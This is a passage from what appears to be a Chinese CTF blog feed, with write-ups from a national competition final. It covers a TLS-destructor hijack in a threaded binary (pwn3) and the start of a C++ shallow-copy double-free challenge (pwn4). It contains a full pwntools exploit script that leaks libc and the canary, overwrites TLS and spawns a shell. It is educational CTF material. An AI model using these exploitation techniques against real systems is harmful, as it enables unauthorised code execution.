rbp的vtabl（改成win_heap_addr，0x55aea44fbcac本来是要打印pizza_object的）从而在call rax时候实现get shell!!!</p><p>基本明白这题的思路了，最后拿shell的漏洞明显专门设计的，略显生硬🚩</p>]]></content>
      
      
      
        <tags>
            
            <tag> CTF </tag>
            
            <tag> PWN </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>国赛_final</title>
      <link href="/2020/09/26/%E5%9B%BD%E8%B5%9B_final%E6%88%98%E8%AE%B0/"/>
      <url>/2020/09/26/%E5%9B%BD%E8%B5%9B_final%E6%88%98%E8%AE%B0/</url>
      
        <content type="html"><![CDATA[<h2 id="国赛-final-in武汉"><a href="#国赛-final-in武汉" class="headerlink" title="国赛_final in武汉"></a>国赛_final in武汉</h2><blockquote><p>第二次打线下了，出现了很多问题。现在的大比赛基本不怎么出heap相关的套路题目了（除了针对新版libc的一些利用方式和复杂的堆风水之外），比较常出的题型有vmpwn，异构架下（mips,arm）的pwn，C++程序以及一些底层机制的漏洞。同时逆向也随之增大。要加强自己的逆向功底了。</p></blockquote><span id="more"></span><h3 id="day1"><a href="#day1" class="headerlink" title="day1"></a>day1</h3><p>第一天是awd，平台崩了，被迫停赛。我也不多bb平台了，着眼于题目吧（质量还是挺高的）。<br>按题目的难易程度来吧：</p><h4 id="pwn3"><a href="#pwn3" class="headerlink" title="pwn3"></a>pwn3</h4><p>一道线程pwn题。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">while</span> ( <span class="number">1</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="keyword">if</span> ( pthread_create(&amp;newthread, <span class="number">0LL</span>, (<span class="type">void</span> *(*)(<span class="type">void</span> *))start_routine, <span class="number">0LL</span>) == <span class="number">-1</span> )</span><br><span class="line">      <span class="built_in">puts</span>(<span class="string">&quot;create thread failed&quot;</span>);</span><br><span class="line">    pthread_join(newthread, <span class="number">0LL</span>);</span><br><span class="line">  &#125;</span><br></pre></td></tr></table></figure><p>漏洞在于start_routine里的__printf_chk存在fmt以及栈溢出。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">unsigned</span> __int64 __fastcall <span class="title function_">start_routine</span><span class="params">(<span class="type">void</span> *a1)</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">char</span> v2; <span class="comment">// [rsp+0h] [rbp-40h]</span></span><br><span class="line">  <span class="type">unsigned</span> __int64 v3; <span class="comment">// [rsp+38h] [rbp-8h]</span></span><br><span class="line">  __int64 retaddr; <span class="comment">// [rsp+48h] [rbp+8h]</span></span><br><span class="line"></span><br><span class="line">  v3 = __readfsqword(<span class="number">0x28</span>u);</span><br><span class="line">  ret_address = (__int64)&amp;retaddr;</span><br><span class="line">  save_ret = retaddr;</span><br><span class="line">  gets(&amp;v2);</span><br><span class="line">  __printf_chk(<span class="number">1LL</span>, (__int64)&amp;v2);</span><br><span class="line">  *(_QWORD *)ret_address = save_ret;</span><br><span class="line">  <span class="keyword">return</span> v3 - __readfsqword(<span class="number">0x28</span>u);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>__printf_chk函数会检测%n以及%()$()这样的的格式，因此只能用-%p-%p-这样泄露了。由于程序存在写回ret_addr的操作，导致栈溢出覆盖返回地址的方法失效了，这也是这道题的难点所在。</p><p>重点，记笔记：<br>在线程中存在一种TSL机制：如果需要在一个线程内部的各个函数调用都能访问、但其它线程不能访问的变量（被称为static memory local to a thread 线程局部静态变量），就需要新的机制来实现，这就是TLS。<br>我们熟知的canary就是存放在tls中，在ret时和stack中的canary比较。</p><p>其结构体为：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span></span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line">  <span class="type">void</span> *tcb;<span class="comment">/* Pointer to the TCB.  Not necessarily the</span></span><br><span class="line"><span class="comment">   thread descriptor used by libpthread.  */</span></span><br><span class="line">  <span class="type">dtv_t</span> *dtv;</span><br><span class="line">  <span class="type">void</span> *self;<span class="comment">/* Pointer to the thread descriptor.  */</span></span><br><span class="line">  <span class="type">int</span> multiple_threads;</span><br><span class="line">  <span class="type">int</span> gscope_flag;</span><br><span class="line">  <span class="type">uintptr_t</span> sysinfo;</span><br><span class="line">  <span class="type">uintptr_t</span> stack_guard;  <span class="comment">/*canary</span></span><br><span class="line"><span class="comment">  uintptr_t pointer_guard;</span></span><br><span class="line"><span class="comment">  unsigned long int vgetcpu_cache[2];</span></span><br><span class="line"><span class="comment">  /* Bit 0: X86_FEATURE_1_IBT.</span></span><br><span class="line"><span class="comment">     Bit 1: X86_FEATURE_1_SHSTK.</span></span><br><span class="line"><span class="comment">   */</span></span><br><span class="line">  <span class="type">unsigned</span> <span class="type">int</span> feature_1;</span><br><span class="line">  <span class="type">int</span> __glibc_unused1;</span><br><span class="line">  <span class="comment">/* Reservation of some values for the TM ABI.  */</span></span><br><span class="line">  <span class="type">void</span> *__private_tm[<span class="number">4</span>];</span><br><span class="line">  <span class="comment">/* GCC split stack support.  */</span></span><br><span class="line">  <span class="type">void</span> *__private_ss;</span><br><span class="line">  <span class="comment">/* The lowest address of shadow stack,  */</span></span><br><span class="line">  <span class="type">unsigned</span> <span class="type">long</span> <span class="type">long</span> <span class="type">int</span> ssp_base;</span><br><span class="line">  <span class="comment">/* Must be kept even if it is no longer used by glibc since programs,</span></span><br><span class="line"><span class="comment">     like AddressSanitizer, depend on the size of tcbhead_t.  */</span></span><br><span class="line">  __128bits __glibc_unused2[<span class="number">8</span>][<span class="number">4</span>] __attribute__ ((aligned (<span class="number">32</span>)));</span><br><span class="line"></span><br><span class="line">  <span class="type">void</span> *__padding[<span class="number">8</span>];</span><br><span class="line">&#125; <span class="type">tcbhead_t</span>;</span><br></pre></td></tr></table></figure><p>在内存中如下：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line">rsp=0x7facd4d2bea8</span><br><span class="line"></span><br><span class="line">telescope 0x7facd4d2c700 100</span><br><span class="line">00:0000│ r8 r9  0x7facd4d2c700 ◂— 0x7facd4d2c700</span><br><span class="line">01:0008│        0x7facd4d2c708 —▸ 0x563b164dc270 ◂— 0x1</span><br><span class="line">02:0010│        0x7facd4d2c710 —▸ 0x7facd4d2c700 ◂— 0x7facd4d2c700</span><br><span class="line">03:0018│        0x7facd4d2c718 ◂— 0x1</span><br><span class="line">04:0020│        0x7facd4d2c720 ◂— 0x0</span><br><span class="line">05:0028│        0x7facd4d2c728 ◂— 0xfe0c23c58eab1200</span><br><span class="line">06:0030│        0x7facd4d2c730 ◂— 0x6bdca8fe08e79c2</span><br><span class="line">07:0038│        0x7facd4d2c738 ◂— 0x0</span><br><span class="line">... ↓</span><br><span class="line">58:02c0│        0x7facd4d2c9c0 —▸ 0x7facd53382b0 (stack_used) ◂— 0x7facd4d2c9c0</span><br><span class="line">... ↓</span><br><span class="line">5a:02d0│ r10    0x7facd4d2c9d0 ◂— 0xb6c /* &#x27;l\x0b&#x27; */</span><br><span class="line">5b:02d8│        0x7facd4d2c9d8 —▸ 0x7facd4d2c9e0 ◂— 0x7facd4d2c9e0</span><br><span class="line">... ↓</span><br><span class="line">5d:02e8│        0x7facd4d2c9e8 ◂— 0xffffffffffffffe0</span><br><span class="line">5e:02f0│        0x7facd4d2c9f0 ◂— 0x0</span><br><span class="line">... ↓</span><br><span class="line">60:0300│        0x7facd4d2ca00 —▸ 0x7facd4d2bf10 —▸ 0x7facd4d2c700 ◂— 0x7facd4d2c700</span><br><span class="line">61:0308│        0x7facd4d2ca08 ◂— 0x0</span><br></pre></td></tr></table></figure><p>可见,tls是在stack上的（比较下面）,可以通过大范围的栈溢出覆盖。</p><p>之后我们发送’a’*0x38+p64(canary)+’a’*0x400（大范围的覆盖）之后查看程序的流程变化：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">  <span class="number">0x563b14c06207</span> &lt;start_routine+<span class="number">110</span>&gt;    nop</span><br><span class="line">  <span class="number">0x563b14c06208</span> &lt;start_routine+<span class="number">111</span>&gt;    mov    rax, qword ptr [rbp - <span class="number">8</span>]</span><br><span class="line">  <span class="number">0x563b14c0620c</span> &lt;start_routine+<span class="number">115</span>&gt;    sub    rax, qword ptr fs:[<span class="number">0x28</span>]</span><br><span class="line">  <span class="number">0x563b14c06215</span> &lt;start_routine+<span class="number">124</span>&gt;    je     start_routine+<span class="number">131</span> &lt;start_routine+<span class="number">131</span>&gt;</span><br><span class="line">   ↓</span><br><span class="line">  <span class="number">0x563b14c0621c</span> &lt;start_routine+<span class="number">131</span>&gt;    leave</span><br><span class="line">► <span class="number">0x563b14c0621d</span> &lt;start_routine+<span class="number">132</span>&gt;    ret             &lt;<span class="number">0x7facd51256db</span>; start_thread+<span class="number">219</span>&gt;</span><br><span class="line">   ↓</span><br><span class="line">  <span class="number">0x7facd51256db</span> &lt;start_thread+<span class="number">219</span>&gt;     mov    qword ptr fs:[<span class="number">0x630</span>], rax</span><br><span class="line">  <span class="number">0x7facd51256e4</span> &lt;start_thread+<span class="number">228</span>&gt;     call   __call_tls_dtors@plt &lt;__call_tls_dtors@plt&gt;</span><br><span class="line"></span><br><span class="line">  <span class="number">0x7facd51256e9</span> &lt;start_thread+<span class="number">233</span>&gt;     xor    eax, eax</span><br></pre></td></tr></table></figure><p>其中__call_tls_dtors函数来析构线程本地存储，diassemble看下：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line">pwndbg&gt; disassemble __call_tls_dtors</span><br><span class="line">Dump of assembler code for function __GI___call_tls_dtors:</span><br><span class="line">   0x00007facd4d70990 &lt;+0&gt;:push   rbp</span><br><span class="line">   0x00007facd4d70991 &lt;+1&gt;:push   rbx</span><br><span class="line">   0x00007facd4d70992 &lt;+2&gt;:sub    rsp,0x8</span><br><span class="line">   0x00007facd4d70996 &lt;+6&gt;:mov    rbp,QWORD PTR [rip+0x3a73c3]        # 0x7facd5117d60</span><br><span class="line">   0x00007facd4d7099d &lt;+13&gt;:mov    rbx,QWORD PTR fs:[rbp+0x0]</span><br><span class="line">   0x00007facd4d709a2 &lt;+18&gt;:test   rbx,rbx</span><br><span class="line">   0x00007facd4d709a5 &lt;+21&gt;:je     0x7facd4d709ee &lt;__GI___call_tls_dtors+94&gt;</span><br><span class="line">   0x00007facd4d709a7 &lt;+23&gt;:nop    WORD PTR [rax+rax*1+0x0]</span><br><span class="line">   0x00007facd4d709b0 &lt;+32&gt;:mov    rdx,QWORD PTR [rbx+0x18]</span><br><span class="line">   0x00007facd4d709b4 &lt;+36&gt;:mov    rax,QWORD PTR [rbx]</span><br><span class="line">   0x00007facd4d709b7 &lt;+39&gt;:mov    rdi,QWORD PTR [rbx+0x8]</span><br><span class="line">   0x00007facd4d709bb &lt;+43&gt;:ror    rax,0x11</span><br><span class="line">   0x00007facd4d709bf &lt;+47&gt;:xor    rax,QWORD PTR fs:0x30</span><br><span class="line">   0x00007facd4d709c8 &lt;+56&gt;:mov    QWORD PTR fs:[rbp+0x0],rdx</span><br><span class="line">   0x00007facd4d709cd &lt;+61&gt;:call   rax</span><br><span class="line">   0x00007facd4d709cf &lt;+63&gt;:mov    rax,QWORD PTR [rbx+0x10]</span><br><span class="line">   0x00007facd4d709d3 &lt;+67&gt;:lock sub QWORD PTR [rax+0x450],0x1</span><br><span class="line">   0x00007facd4d709dc &lt;+76&gt;:mov    rdi,rbx</span><br><span class="line">   0x00007facd4d709df &lt;+79&gt;:call   0x7facd4d4e2c8 &lt;free@plt&gt;</span><br><span class="line">   0x00007facd4d709e4 &lt;+84&gt;:mov    rbx,QWORD PTR fs:[rbp+0x0]</span><br><span class="line">   0x00007facd4d709e9 &lt;+89&gt;:test   rbx,rbx</span><br><span class="line">   0x00007facd4d709ec &lt;+92&gt;:jne    0x7facd4d709b0 &lt;__GI___call_tls_dtors+32&gt;</span><br><span class="line">   0x00007facd4d709ee &lt;+94&gt;:add    rsp,0x8</span><br><span class="line">   0x00007facd4d709f2 &lt;+98&gt;:pop    rbx</span><br><span class="line">   0x00007facd4d709f3 &lt;+99&gt;:pop    rbp</span><br><span class="line">   0x00007facd4d709f4 &lt;+100&gt;:ret</span><br><span class="line">End of assembler dump.</span><br></pre></td></tr></table></figure><p>其中，mov rbx,QWORD PTR fs:[rbp+0x0]使得我们通过栈溢出改写tls的内容（也即fs），进而控制rbx，使得其不跳转并继续往下执行。<br>rax,QWORD PTR [rbx]，rax也可控，只是要经过ror rax,0x11和xor rax,QWORD PTR fs:0x30的运算后结果为one_gadget，之后call rax拿shell。<br>因此我们就要提前布置好fs的内容。</p><p>exp:</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">context.arch=<span class="string">&#x27;amd64&#x27;</span></span><br><span class="line">context.log_level=<span class="string">&#x27;debug&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">debug</span>(<span class="params">addr,PIE=<span class="literal">True</span></span>):</span><br><span class="line"><span class="keyword">if</span> PIE:</span><br><span class="line">text_base = <span class="built_in">int</span>(os.popen(<span class="string">&quot;pmap &#123;&#125;| awk &#x27;&#123;&#123;print $1&#125;&#125;&#x27;&quot;</span>.<span class="built_in">format</span>(p.pid)).readlines()[<span class="number">1</span>], <span class="number">16</span>)</span><br><span class="line">gdb.attach(p,<span class="string">&#x27;b *&#123;&#125;&#x27;</span>.<span class="built_in">format</span>(<span class="built_in">hex</span>(text_base+addr)))</span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">gdb.attach(p,<span class="string">&quot;b *&#123;&#125;&quot;</span>.<span class="built_in">format</span>(<span class="built_in">hex</span>(addr)))</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">rol</span>(<span class="params">value</span>):</span><br><span class="line">low = (value&amp;<span class="number">0xffff800000000000</span>)&gt;&gt;<span class="number">47</span></span><br><span class="line">hight = (value&amp;<span class="number">0x7fffffffffff</span>)&lt;&lt;<span class="number">17</span></span><br><span class="line"><span class="keyword">return</span> hight | low</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">ror</span>(<span class="params">value</span>):</span><br><span class="line">hight = (value&amp;<span class="number">0x1ffff</span>)&lt;&lt;<span class="number">47</span></span><br><span class="line">low = (value&amp;<span class="number">0xfffffffffffe0000</span>)&gt;&gt;<span class="number">17</span></span><br><span class="line"><span class="keyword">return</span> hight | low</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">main</span>(<span class="params">host,port=<span class="number">9999</span></span>):</span><br><span class="line"><span class="keyword">global</span> p</span><br><span class="line"><span class="keyword">if</span> host:</span><br><span class="line">p = remote(host,port)</span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">p = process(<span class="string">&quot;./pwn3&quot;</span>)</span><br><span class="line"><span class="comment"># p = process(&quot;./pwn&quot;,env=&#123;&quot;LD_PRELOAD&quot;:&quot;./x64_libc.so.6&quot;&#125;)</span></span><br><span class="line"><span class="comment"># gdb.attach(p,&quot;b *0x0000000000400A5F&quot;)</span></span><br><span class="line">debug(<span class="number">0x0000000000011F1</span>)</span><br><span class="line">p.sendline(<span class="string">&quot;+%p-%p-%p-%p%-%p-%p-%p-%p%-%p-%p-%p-%p-%p+%p=&quot;</span>)</span><br><span class="line">p.recvuntil(<span class="string">&#x27;+&#x27;</span>)</span><br><span class="line">libc.address = <span class="built_in">int</span>(p.recvuntil(<span class="string">&#x27;-&#x27;</span>)[:-<span class="number">1</span>],<span class="number">16</span>) - <span class="number">0x3ed8d0</span></span><br><span class="line">info(<span class="string">&#x27;libc : &#x27;</span>+<span class="built_in">hex</span>(libc.address))</span><br><span class="line">p.recvuntil(<span class="string">&#x27;+&#x27;</span>)</span><br><span class="line">canary = <span class="built_in">int</span>(p.recvuntil(<span class="string">&#x27;=&#x27;</span>)[:-<span class="number">1</span>],<span class="number">16</span>)</span><br><span class="line">info(<span class="string">&#x27;canary : &#x27;</span>+<span class="built_in">hex</span>(canary))</span><br><span class="line"></span><br><span class="line">sleep(<span class="number">0.3</span>)</span><br><span class="line"></span><br><span class="line">payload = <span class="string">&quot;%p&quot;</span>*(<span class="number">0x38</span>/<span class="number">2</span>)+p64(canary)</span><br><span class="line">p.sendline(payload)</span><br><span class="line">p.recvuntil(<span class="built_in">hex</span>(libc.address-<span class="number">0x900</span>)*<span class="number">2</span>)</span><br><span class="line">p.recvuntil(<span class="string">&quot;0x&quot;</span>)</span><br><span class="line">xor1 = <span class="built_in">int</span>(p.recvuntil(<span class="string">&quot;0x&quot;</span>)[:-<span class="number">2</span>],<span class="number">16</span>)</span><br><span class="line">p.recvuntil(<span class="string">&quot;(nil)(nil)&quot;</span>)</span><br><span class="line">p.recvuntil(<span class="string">&quot;0x&quot;</span>)</span><br><span class="line">p.recvuntil(<span class="string">&quot;0x&quot;</span>)</span><br><span class="line">xor2 = <span class="built_in">int</span>(p.recvuntil(<span class="string">&quot;0x&quot;</span>)[:-<span class="number">2</span>],<span class="number">16</span>)</span><br><span class="line"><span class="comment"># info(&quot;xor1: &quot; + hex(xor1))</span></span><br><span class="line">info(<span class="string">&quot;xor2: &quot;</span> + <span class="built_in">hex</span>(xor2))</span><br><span class="line">xor1 = libc.address-<span class="number">0x1100</span></span><br><span class="line"></span><br><span class="line">sleep(<span class="number">0.3</span>)</span><br><span class="line">one = <span class="number">0x4f3c2</span> + libc.address</span><br><span class="line">payload = <span class="string">&quot;A&quot;</span>*<span class="number">0x38</span>+p64(canary)*<span class="number">2</span>+p64(one)</span><br><span class="line">payload += p64(<span class="number">0</span>)+p64(libc.address-<span class="number">0x900</span>)*<span class="number">2</span></span><br><span class="line">payload += p64(<span class="number">0</span>)+p64(libc.address-<span class="number">0x1040</span>)+p64(rol((ror(xor2)^xor1)^one))</span><br><span class="line">payload += p64(<span class="number">0</span>)*<span class="number">0xe8</span>+p64(<span class="number">0x3ec560</span>+libc.address)+p64(libc.address-<span class="number">0x248</span>)</span><br><span class="line">payload += p64(libc.address-<span class="number">0x10d8</span>)*<span class="number">0x10</span>+p64(libc.address-<span class="number">0x10d8</span>)</span><br><span class="line">p.sendline(payload)</span><br><span class="line"></span><br><span class="line">p.interactive()</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&quot;__main__&quot;</span>:</span><br><span class="line">libc = ELF(<span class="string">&quot;/lib/x86_64-linux-gnu/libc.so.6&quot;</span>,checksec=<span class="literal">False</span>)</span><br><span class="line"><span class="comment"># libc = ELF(&quot;./x64_libc.so.6&quot;,checksec=False)</span></span><br><span class="line"><span class="comment"># elf = ELF(&quot;./babyheap&quot;,checksec=False)</span></span><br><span class="line">main(args[<span class="string">&#x27;REMOTE&#x27;</span>])</span><br></pre></td></tr></table></figure><h4 id="pwn4"><a href="#pwn4" class="headerlink" title="pwn4"></a>pwn4</h4><p>第二道就是一道C++的题目了，pwnable.tw上的原题CAOV。<br>漏洞在于浅拷贝导致的析构函数会dele存在于stack上的指针，而这个指针指向的是我们的password结构，从而在我们可以利用chang_password()形成类似于UAF的效果。</p><p>漏洞代码：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">unsigned</span> __int64 <span class="title function_">edit_info</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">  __int64 v0; <span class="comment">// rbx</span></span><br><span class="line">  __int64 v1; <span class="comment">// rax</span></span><br><span class="line">  __int64 v2; <span class="comment">// rax</span></span><br><span class="line">  <span class="type">char</span> v4; <span class="comment">// [rsp+0h] [rbp-50h]</span></span><br><span class="line">  <span class="type">char</span> v5; <span class="comment">// [rsp+20h] [rbp-30h]</span></span><br><span class="line">  <span class="type">unsigned</span> __int64 v6; <span class="comment">// [rsp+38h] [rbp-18h]</span></span><br><span class="line"></span><br><span class="line">  v6 = __readfsqword(<span class="number">0x28</span>u);</span><br><span class="line">  initial((__int64)&amp;v4);</span><br><span class="line">  sub_401DDA((__int64)&amp;v5, (__int64)&amp;v4, (<span class="type">const</span> <span class="type">char</span> **)qword_6032A0);</span><br><span class="line">  dele((__int64)&amp;v5);    <span class="comment">//bug</span></span><br><span class="line">  v0 = sub_402164((__int64)&amp;v4);</span><br><span class="line">  v1 = <span class="built_in">std</span>::operator&lt;&lt;&lt;<span class="built_in">std</span>::char_traits&lt;<span class="type">char</span>&gt;&gt;(&amp;<span class="built_in">std</span>::<span class="built_in">cout</span>, <span class="string">&quot;STUDENT: &quot;</span>);</span><br><span class="line">  v2 = <span class="built_in">std</span>::operator&lt;&lt;&lt;<span class="built_in">std</span>::char_traits&lt;<span class="type">char</span>&gt;&gt;(v1, v0);</span><br><span class="line">  <span class="built_in">std</span>::ostream::operator&lt;&lt;(v2, &amp;<span class="built_in">std</span>::<span class="built_in">endl</span>&lt;<span class="type">char</span>,<span class="built_in">std</span>::char_traits&lt;<span class="type">char</span>&gt;&gt;);</span><br><span class="line">  sub_401E6C(qword_6032A0);</span><br><span class="line">  dele((__int64)&amp;v4);</span><br><span class="line">  <span class="keyword">return</span> __readfsqword(<span class="number">0x28</span>u) ^ v6;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>效果展示：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">00:0000│ rsp      0x7ffc82d0fa50 —▸ 0x1985c60 ◂— &#x27;PB19000001&#x27;</span><br><span class="line">01:0008│          0x7ffc82d0fa58 ◂— 0x6400000064 /* &#x27;d&#x27; */</span><br><span class="line">... ↓</span><br><span class="line">03:0018│          0x7ffc82d0fa68 ◂— 0x21 /* &#x27;!&#x27; */</span><br><span class="line">04:0020│ rax rdi  0x7ffc82d0fa70 —▸ 0x6032f0 ◂— 0x0</span><br><span class="line">05:0028│          0x7ffc82d0fa78 ◂— 0x21 /* &#x27;!&#x27; */</span><br><span class="line">06:0030│          0x7ffc82d0fa80 ◂— 0x0</span><br><span class="line">07:0038│          0x7ffc82d0fa88 ◂— 0x3fdc5116f3e23a00</span><br></pre></td></tr></table></figure><p>位于rsp+0x20的位置存在的0x6032f0会被dele，由于我们提前change_password使得构造如下：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">pwndbg&gt; x/20gx 0x6032e0</span><br><span class="line">0x6032e0:0x00000000000000000x0000000000000071</span><br><span class="line">0x6032f0:0x00000000000000000x0000000000000000</span><br><span class="line">0x603300:0x00000000000000000x0000000000000000</span><br><span class="line">0x603310:0x00000000000000000x0000000000000000</span><br><span class="line">0x603320:0x00000000000000000x0000000000000000</span><br><span class="line">0x603330:0x00000000000000000x0000000000000000</span><br><span class="line">0x603340:0x00000000000000000x0000000000000000</span><br><span class="line">0x603350:0x00000000000000000x0000000000000021</span><br><span class="line">0x603360:0x00000000006032f00x0000000000000021</span><br><span class="line">0x603370:0x00000000000000000x0000000000000000</span><br></pre></td></tr></table></figure><p>从而会将其dele到0x70的fastbin。</p><p>之后我们考虑如何泄露：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">0x603270:0x00000000000000000x0000000000000000</span><br><span class="line">0x603280 &lt;stderr&gt;:0x00007f37cc70b5400x00007f37cc70b620</span><br><span class="line">0x603290:0x00000000000000000x0000000000000000</span><br><span class="line">0x6032a0:0x0000000001985c200x0000000000000000</span><br><span class="line">0x6032b0:0x00000000000000000x0000000000000000</span><br><span class="line">0x6032c0:0x0000006e696d64610x0000000000000000</span><br><span class="line">0x6032d0:0x00000000000000000x0000000000000000</span><br><span class="line">0x6032e0:0x00000000000000000x0000000000000071</span><br><span class="line">0x6032f0:0x00000000000000000x0000000000000000</span><br><span class="line">0x603300:0x00000000000000000x0000000000000000</span><br><span class="line">0x603310:0x00000000000000000x0000000000000000</span><br><span class="line">0x603320:0x00000000000000000x0000000000000000</span><br><span class="line">0x603330:0x00000000000000000x0000000000000000</span><br><span class="line">0x603340:0x00000000000000000x0000000000000000</span><br><span class="line">0x603350:0x00000000000000000x0000000000000021</span><br><span class="line">0x603360:0x00000000006032f00x0000000000000021</span><br><span 